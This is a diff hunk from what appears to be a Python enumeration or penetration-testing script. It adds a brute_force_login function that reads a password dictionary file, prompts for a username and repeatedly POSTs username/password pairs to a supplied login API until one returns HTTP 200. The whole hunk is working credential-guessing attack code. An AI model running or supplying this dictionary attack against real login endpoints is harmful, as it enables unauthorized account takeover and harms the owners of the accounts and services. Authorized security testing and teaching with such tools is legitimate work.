@@ -233,5 +233,41 @@ EEEEEEEEEEEEEEEEEEEEEENNNNNNNN         NNNNNNN      UUUUUUUUU      MMMMMMMM     
         for file in files_output:
             f.write(file + "\n")
 
+def brute_force_login(login_api):
+    # Brute force the login API through a dictionary attack on POST requests
+
+    # Read the passwords from the provided file
+    passwords = open("./input_files/passwords_dictionary.bat", "r").read().splitlines()
+
+    # Get the username from the user
+    username = input("Enter the username: ")
+
+    # Check if the username is valid
+    if username == "":
+        print("Invalid username.")
+        sys.exit(1)
+    
+    # Loop through the passwords and try to login
+    for password in passwords:
+        if password == "":
+            continue
+
+        # Create the data to send in the POST request
+        data = {
+            "username": username,
+            "password": password
+        }
+
+        print("Trying password: " + password)
+        
+        # Send the POST request
+        req = requests.post(login_api, data=data)
+
+        # Check if the login was successful
+        if req.status_code == 200:
+            print(f"Found password: {password}")
+            return password
+
+
 if __name__ == "__main__":
     main()
